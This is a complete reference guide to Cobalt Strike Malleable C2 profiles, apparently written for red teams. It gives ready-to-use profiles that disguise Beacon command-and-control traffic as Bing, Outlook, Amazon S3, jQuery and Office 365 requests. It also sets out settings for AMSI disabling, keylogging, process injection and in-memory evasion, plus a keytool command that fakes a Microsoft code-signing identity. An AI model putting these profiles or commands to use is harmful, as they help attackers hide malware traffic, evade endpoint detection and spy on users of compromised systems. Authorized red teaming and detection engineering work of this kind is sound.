# Cobalt Strike — Malleable C2 Profile Complete Reference (English)

> Malleable C2 profiles control every aspect of Beacon's network traffic, in-memory representation, and post-exploitation behavior. A well-crafted profile is the single most impactful OPSEC control available.

---

## Table of Contents

1. [What Is a Malleable C2 Profile?](#1-what-is-a-malleable-c2-profile)
2. [Profile Syntax Fundamentals](#2-profile-syntax-fundamentals)
3. [Global Options](#3-global-options)
4. [http-get Block](#4-http-get-block)
5. [http-post Block](#5-http-post-block)
6. [http-stager Block](#6-http-stager-block)
7. [dns-beacon Block](#7-dns-beacon-block)
8. [stage Block](#8-stage-block)
9. [post-ex Block](#9-post-ex-block)
10. [process-inject Block](#10-process-inject-block)
11. [Code Signing Certificate](#11-code-signing-certificate)
12. [Complete Example Profiles](#12-complete-example-profiles)
13. [Profile Validation & Testing](#13-profile-validation--testing)

---

## 1. What Is a Malleable C2 Profile?

A Malleable C2 profile is a domain-specific language (DSL) file (`.profile`) that Cobalt Strike's Team Server reads at startup. It controls:

- **HTTP traffic shape** — headers, URIs, cookies, query strings, how data is encoded
- **In-memory Beacon appearance** — PE headers, strings, memory permissions
- **Post-exploitation behavior** — spawnto, AMSI bypass, keylogger, injection method
- **Staging** — how the stager downloads the full Beacon

Profiles are loaded at team server startup and cannot be changed while the server is running. Beacons adopt the profile configured at the time of their generation.

### Why Profiles Matter for Detection

Cobalt Strike with the **default profile** is trivially detected by most EDR/NDR products because the default HTTP traffic looks identical across all CS installations. A profile that mimics a legitimate application (Amazon, Bing, Microsoft Teams) makes network-level detection far harder.

---

## 2. Profile Syntax Fundamentals

### File Extension

```
.profile
```

### Comments

```
# This is a comment
```

### String Values

```
set option_name "value";
```

### Blocks

```
block_name {
    set option "value";
    sub_block {
        set option "value";
    }
}
```

### Data Transforms

Data transforms describe how Cobalt Strike should encode/decode data before putting it on the wire.

```
# Available transforms (in order of application):
append    "string"        # append literal string
prepend   "string"        # prepend literal string
base64               # base64 encode/decode
base64url            # URL-safe base64
mask                 # XOR with random 4-byte key
netbios              # NetBIOS encode
netbiosu             # NetBIOS uppercase
urlencode            # URL encode
print                # print raw value (final step for sending)
```

Transforms are applied in order (top to bottom on send, reversed on receive):

```
# Example: base64-encode the Beacon data, then prepend a fake session cookie
transform-x64 {
    prepend "sessid=";
    base64;
    prepend "data=";
}
```

### Data Storage Containers

Where in the HTTP request to store data:

```
header   "Header-Name"    # HTTP header
parameter "name"          # query string parameter (?name=value)
uri-append               # append to URI
print                    # body (used for POST)
```

---

## 3. Global Options

Set globally at the top of the profile:

```
# Beacon sleep interval (seconds)
set sleeptime "60000";         # milliseconds! (60000 = 60 seconds)

# Sleep jitter percentage
set jitter "20";

# Maximum size of GET requests (bytes)
set maxdns "255";

# How Beacon identifies itself
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

# Hostname used when Beacon resolves C2 (can differ from listener host)
set host_stage "off";          # don't stage if stageless

# Pipe names for SMB Beacons
set pipename "mojo.5688.8052.183894939787088877##";
set pipename_stager "mojo.5688.8052.##";

# TCP Beacon port
set tcp_port "4444";
set tcp_frame_header "\x80";

# SSH Beacon settings (CS 4.x)
set ssh_banner "OpenSSH_7.4 FreeBSD (protocol 2.0)";
set ssh_pipename "wkssvc##";
```

---

## 4. http-get Block

Defines how the Beacon **checks in** and downloads tasks.

```
http-get {

    set uri "/search";           # URI Beacon uses for GET requests
    set verb "GET";              # HTTP method (GET is default)

    client {
        # Headers sent by Beacon
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Referer" "https://www.google.com/";
        header "Accept-Encoding" "gzip, deflate";

        # Where to store the session ID (metadata)
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }

    server {
        # Headers sent by Team Server in response
        header "Content-Type" "text/html; charset=utf-8";
        header "Cache-Control" "no-cache";
        header "X-XSS-Protection" "1; mode=block";
        header "Server" "nginx";

        # Where Beacon tasks are hidden in the response
        output {
            netbios;
            prepend "<!DOCTYPE html><html><head><title>Loading...</title></head><body><p>";
            append "</p></body></html>";
            print;
        }
    }
}
```

### Full Example — Mimicking Bing Search

```
http-get {
    set uri "/search";

    client {
        header "Host" "www.bing.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Connection" "keep-alive";
        header "Upgrade-Insecure-Requests" "1";

        metadata {
            base64url;
            prepend "q=";
            parameter "q";
        }
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";
        header "Cache-Control" "private, max-age=0";
        header "X-MSEdge-Ref" "Ref A: ";
        header "Vary" "Accept-Encoding";

        output {
            netbios;
            prepend "<!-- data -->";
            append "<!-- /data -->";
            print;
        }
    }
}
```

---

## 5. http-post Block

Defines how Beacon **sends results** back to the Team Server.

```
http-post {

    set uri "/collect";
    set verb "POST";

    client {
        header "Accept" "*/*";
        header "Content-Type" "application/x-www-form-urlencoded";

        # Session ID in cookie
        id {
            parameter "id";
        }

        # Exfiltrated output in POST body
        output {
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "text/html";

        output {
            print;
        }
    }
}
```

### Example — POST mimicking Outlook Web App

```
http-post {
    set uri "/owa/auth/logon.aspx";
    set verb "POST";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Content-Type" "application/x-www-form-urlencoded";
        header "Referer" "https://mail.corp.com/owa/auth/logon.aspx";

        id {
            base64url;
            prepend "clbl=1&url=https%3A%2F%2Fmail.corp.com%2Fowa%2F&reason=0&EMailAddress=";
            append "&password=";
            print;
        }

        output {
            base64url;
            prepend "flags=4&forcedownlevel=0&trusted=0&isUtf8=1&destination=https%3A%2F%2Fmail.corp.com%2Fowa%2F&username=";
            print;
        }
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";
        header "X-Frame-Options" "SAMEORIGIN";
        header "X-OWA-Version" "15.2.1118.7";

        output {
            print;
        }
    }
}
```

---

## 6. http-stager Block

Defines how the **stager** downloads the full Beacon payload.

```
http-stager {
    set uri_x86 "/favicon.ico";
    set uri_x64 "/logo.png";

    client {
        header "Accept" "image/avif,image/webp,*/*";
        header "Referer" "https://www.corp.com/";
    }

    server {
        header "Content-Type" "image/x-icon";
        header "Cache-Control" "max-age=86400";

        output {
            print;
        }
    }
}
```

> For stageless payloads, `http-stager` is irrelevant. Prefer stageless for better OPSEC.

---

## 7. dns-beacon Block

Controls DNS Beacon behavior.

```
dns-beacon {
    # DNS resolver to use for lookups (default: system DNS)
    set dns_resolver "8.8.8.8";

    # Sleep time for DNS mode (milliseconds, separate from global sleeptime)
    set dns_sleep "5000";

    # Max length of DNS hostname used per request
    set maxdns "255";

    # DNS A record to use as a "dead" (idle) indicator
    set dns_idle "8.8.8.8";

    # Sub-domains for different request types
    set dns_stager_subhost ".stage.";
    set dns_stager_prepend ".wwwds.";
}
```

### DNS Beacon Communication Flow

```
Beacon → DNS A  query: <encoded_data>.c2.corp.com  → Team Server (authoritative NS)
Team Server → DNS A response: <task_encoded_as_IP>
```

Higher-bandwidth modes:
```
Beacon → DNS TXT query: <data>.c2.corp.com → up to 255 bytes per record
Beacon → DNS AAAA query → 16 bytes (IPv6) per record
```

---

## 8. stage Block

Controls how Beacon is **loaded into memory** — the most important block for in-memory evasion.

```
stage {

    # PE Header manipulation
    set stomppe      "true";         # overwrite PE headers with garbage after loading
    set obfuscate    "true";         # scramble the reflective loader
    set userwx       "false";        # don't use RWX memory (W^X — write XOR execute)
    set smartinject  "true";         # use exact addresses from PEB instead of scanning
    set cleanup      "true";         # zero out Beacon's PE from memory after reflective load

    # Sleep masking — XOR-encrypts Beacon's heap/stack while sleeping
    set sleep_mask   "true";

    # Remove strings from Beacon that look like C2 config
    set magic_mz_x86 "MZRE";        # fake MZ header bytes (x86)
    set magic_mz_x64 "MZAR";        # fake MZ header bytes (x64)
    set magic_pe     "PE";           # fake PE signature

    # Stack duplication during sleep (CS 4.5+) — masks Beacon's call stack
    set stackspoof   "true";

    # Module masquerading — map Beacon over a legitimate DLL's memory space
    set module_x86   "wwanmm.dll";
    set module_x64   "wwanmm.dll";

    # Transform-x86 / transform-x64: modify raw shellcode before embedding in payload
    transform-x86 {
        prepend "\x90\x90\x90\x90";           # 4-byte NOP sled
        strrep  "ReflectiveDll.dll" "";        # remove telltale string
        strrep  "beacon.dll" "";
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90";
        strrep  "ReflectiveDll.dll" "";
        strrep  "beacon.dll" "";
    }

    # Strings to remove from compiled Beacon
    stringw "ReflectiveLoader";
    string  "beacon.dll";
    string  "%02d/%02d/%02d %02d:%02d:%02d";
}
```

### Memory Layout with `userwx false`

Without `userwx false`: Beacon sits in RWX memory — trivial to detect with memory scanners.  
With `userwx false`: Beacon sits in RX memory; the reflective loader writes to a separate RW section then transitions.

### Module Stomping / Masquerading

```
set module_x64 "wwanmm.dll";
```

Beacon will load itself **over** an existing mapped copy of `wwanmm.dll` in the target process. Instead of an anonymous `MEM_PRIVATE` memory region (suspicious), the Beacon memory appears as a legitimate module-backed `MEM_IMAGE` region.

---

## 9. post-ex Block

Controls post-exploitation behaviors (spawn-to, AMSI, injection method, etc.).

```
post-ex {

    # Process to spawn for post-ex jobs (fork&run)
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\system32\\dllhost.exe";

    # Obfuscate output while it's in memory
    set obfuscate "true";

    # Smart injection: use module-backed memory for injected code
    set smartinject "true";

    # Disable AMSI in spawnto process before executing .NET / PS
    set amsi_disable "true";

    # Keylogger implementation to use
    set keylogger "GetAsyncKeyState";    # or "SetWindowsHookEx"

    # Pipe name for post-ex comms (fork&run named pipe)
    set pipename "Winsock2\\CatalogChangeListener-###-0";
    # Can also set a list:
    # set pipename "Winsock2\\CatalogChangeListener-###-0,";

    # Thread stack spoofing for spawned threads (CS 4.5+)
    set threaddetach "true";
}
```

### AMSI Disable Behavior

When `amsi_disable "true"` is set, Beacon will patch AMSI in the spawned post-ex process before executing PowerShell or .NET assemblies. This is done by overwriting `AmsiScanBuffer` with a bypass.

### Keylogger Options

| Option | Method | Notes |
|---|---|---|
| `GetAsyncKeyState` | Polls the API in a tight loop | Works for all users, no hook, less detectable |
| `SetWindowsHookEx` | Installs a keyboard hook | More reliable for background apps, more visible |

---

## 10. process-inject Block

Controls how Beacon injects code into other processes.

```
process-inject {

    # Minimum allocation size (pad to prevent page-exact allocation — common detection)
    set min_alloc "16384";

    # Allocation method:
    # VirtualAllocEx, NtMapViewOfSection
    set startrwx   "false";     # allocate as RW first, then change to RX
    set userwx     "false";     # never use RWX

    # Transform: modify shellcode before injection
    transform-x86 {
        prepend "\x90\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90\x90";
    }

    # How to execute injected code:
    execute {
        CreateThread "ntdll!RtlUserThreadStart";   # fake start address
        CreateRemoteThread;
        NtQueueApcThread-s;                        # suspended APC
        SetThreadContext;
        RtlCreateUserThread;
        NtQueueApcThread;
    }
}
```

### Injection Execution Methods Explained

| Method | Description | Detection Risk |
|---|---|---|
| `CreateRemoteThread` | Classic injection | High — commonly monitored |
| `NtQueueApcThread` | APC injection into existing thread | Medium |
| `NtQueueApcThread-s` | APC into suspended thread | Lower |
| `SetThreadContext` | Hijack existing thread context | Medium |
| `RtlCreateUserThread` | Undocumented NT function | Lower than CreateRemoteThread |
| `CreateThread` | Local thread creation (inject self) | Low |

---

## 11. Code Signing Certificate

Beacon payloads can be code-signed to pass signature checks.

```
code-signer {
    set keystore "keystore.jks";
    set password "password";
    set alias    "server";
    set timestamp "true";
    set timestamp_url "http://timestamp.verisign.com/scripts/timstamp.dll";
    set digest_algorithm "SHA-256";
}
```

Generate self-signed cert (operator box):
```bash
keytool -genkey -alias server -keyalg RSA -keysize 2048 -keystore keystore.jks -storepass password -validity 3650 -dname "CN=Microsoft Corporation, OU=Windows, O=Microsoft, L=Redmond, ST=Washington, C=US"
```

> A self-signed cert won't pass strict Authenticode validation but defeats many simple "signed?" checks. Purchase an EV cert for higher-fidelity bypass.

---

## 12. Complete Example Profiles

### Profile A — Amazon S3 Mimicry

```
set sleeptime "5000";
set jitter    "20";
set useragent "aws-sdk-go/1.44.0 (go1.18.3; linux; amd64)";

http-get {
    set uri "/s3/bucket/objects/list";

    client {
        header "Accept"          "*/*";
        header "Content-Type"    "application/xml";
        header "X-Amz-Date"     "20230601T120000Z";
        header "X-Amz-Security-Token" "FQoGZXIvYXdzEMr//...";

        metadata {
            base64url;
            prepend "X-Amz-Cf-Id=";
            header "X-Amz-Cf-Id";
        }
    }

    server {
        header "Content-Type"   "application/xml";
        header "x-amz-request-id" "TX00000000000000000";
        header "x-amz-id-2"    "s3/";
        header "Server"        "AmazonS3";

        output {
            netbios;
            prepend "<?xml version=\"1.0\" encoding=\"UTF-8\"?><ListBucketResult>";
            append  "</ListBucketResult>";
            print;
        }
    }
}

http-post {
    set uri "/s3/bucket/objects/put";
    set verb "PUT";

    client {
        header "Content-Type" "application/octet-stream";
        header "X-Amz-Date"  "20230601T120000Z";

        id {
            base64url;
            prepend "upload_id=";
            parameter "upload_id";
        }

        output {
            print;
        }
    }

    server {
        header "Content-Type" "application/xml";

        output {
            print;
        }
    }
}

stage {
    set stomp_pe    "true";
    set userwx      "false";
    set sleep_mask  "true";
    set cleanup     "true";
    set obfuscate   "true";
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\system32\\dllhost.exe";
    set amsi_disable "true";
    set obfuscate   "true";
}
```

### Profile B — jQuery CDN Mimicry

```
set sleeptime "3000";
set jitter    "30";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0";

http-get {
    set uri "/jquery-3.7.1.min.js";

    client {
        header "Host"            "code.jquery.com";
        header "Accept"          "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Referer"         "https://www.corp.com/";
        header "Accept-Encoding" "gzip, deflate, br";

        metadata {
            base64url;
            prepend "__utm=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type"   "application/javascript; charset=utf-8";
        header "Cache-Control"  "public, max-age=31536000";
        header "Access-Control-Allow-Origin" "*";

        output {
            netbiosu;
            prepend "/*! jQuery v3.7.1 | (c) OpenJS Foundation | jquery.org/license */";
            append  "//# sourceMappingURL=jquery-3.7.1.min.js.map";
            print;
        }
    }
}

http-post {
    set uri "/jquery-3.7.1.min.js";
    set verb "POST";

    client {
        header "Content-Type" "application/x-www-form-urlencoded; charset=UTF-8";
        header "X-Requested-With" "XMLHttpRequest";

        id {
            base64url;
            prepend "callback=jQuery";
            append "&_=";
            parameter "callback";
        }

        output {
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "application/javascript";

        output {
            print;
        }
    }
}

stage {
    set stomppe     "true";
    set obfuscate   "true";
    set userwx      "false";
    set sleep_mask  "true";
    set cleanup     "true";
    set module_x64  "xpsservices.dll";
    set module_x86  "xpsservices.dll";
}

post-ex {
    set spawnto_x86  "%windir%\\syswow64\\svchost.exe";
    set spawnto_x64  "%windir%\\system32\\svchost.exe";
    set amsi_disable "true";
    set obfuscate    "true";
    set keylogger    "GetAsyncKeyState";
}

process-inject {
    set min_alloc "16384";
    set startrwx  "false";
    set userwx    "false";
    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        NtQueueApcThread-s;
        RtlCreateUserThread;
    }
}
```

### Profile C — Office 365 Mimicry

```
set sleeptime "10000";
set jitter    "25";
set useragent "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.16130; Pro)";

http-get {
    set uri "/api/v2.0/me/messages";

    client {
        header "Accept"        "application/json";
        header "Authorization" "Bearer eyJ0eXAiOiJKV1QiLCJhbGc...";
        header "client-request-id" "00000000-0000-0000-0000-000000000000";
        header "x-ms-client-request-id" "00000000-0000-0000-0000-000000000000";

        metadata {
            base64url;
            prepend "$select=id,subject,from,receivedDateTime,isRead,";
            header "Prefer";
        }
    }

    server {
        header "Content-Type"   "application/json;odata.metadata=minimal;odata.streaming=true;IEEE754Compatible=false;charset=utf-8";
        header "request-id"     "00000000-0000-0000-0000-000000000000";
        header "OData-Version"  "4.0";

        output {
            netbios;
            prepend "{\"@odata.context\":\"https://graph.microsoft.com/v1.0/$metadata#Me/messages\",\"@odata.nextLink\":\"https://graph.microsoft.com/v1.0/me/messages?$skip=10\",\"value\":[{\"@odata.etag\":\"";
            append  "\"}]}";
            print;
        }
    }
}

http-post {
    set uri "/api/v2.0/me/sendMail";
    set verb "POST";

    client {
        header "Content-Type" "application/json";
        header "Accept"       "application/json";

        id {
            base64url;
            prepend "X-ClientTraceId: ";
            header "X-ClientTraceId";
        }

        output {
            base64url;
            print;
        }
    }

    server {
        header "Content-Type" "application/json";

        output {
            print;
        }
    }
}

stage {
    set stomppe    "true";
    set obfuscate  "true";
    set userwx     "false";
    set sleep_mask "true";
    set cleanup    "true";
    set stackspoof "true";
}

post-ex {
    set spawnto_x64  "%windir%\\system32\\dllhost.exe";
    set spawnto_x86  "%windir%\\syswow64\\dllhost.exe";
    set amsi_disable "true";
    set obfuscate    "true";
}
```

---

## 13. Profile Validation & Testing

### `c2lint` — Built-in Profile Validator

```bash
# Run c2lint before starting team server
./c2lint <profile.profile>

# Expected output:
[+] Profile (example.profile) parsed successfully!
[-] Profile (example.profile) has errors:
    line 42: Unknown option 'badoption'
```

Always run `c2lint` after editing. A syntactically invalid profile will crash the team server on start.

### Network Traffic Validation

After deploying a Beacon with the profile, use Wireshark to verify:

```
# Capture on team server interface
tcpdump -i eth0 -w capture.pcap port 80 or port 443
wireshark capture.pcap

# Verify:
# - URI matches profile setting
# - Headers match profile settings
# - Payload encoding is correct
# - No obvious CS strings in HTTP body
```

### Memory Validation

On the target host, use:
```powershell
# Check for suspicious memory regions
Get-Process | ForEach-Object {
    $p = $_
    try {
        $handle = [System.Diagnostics.Process]::GetProcessById($p.Id)
        # Look for RWX regions or anonymous private memory
    } catch {}
}
```

Or use tools like `pe-sieve`, `moneta`, `hunt-sleeping-beacons` to detect improperly configured Beacons.

### Profile Scoring / Detection Testing

Tools to test profile evasiveness:
- **cs-decrypt-metadata** — decode live Beacon traffic
- **malseclogic/malleable-c2-randomizer** — generate random profile variants
- **rsmudge/malleable-c2-profiles** — community profile collection
- **threatexpress/malleable-c2** — Red team profile collection

---

*Last updated: 2026-06-09 | Reference for authorized red team use only.*
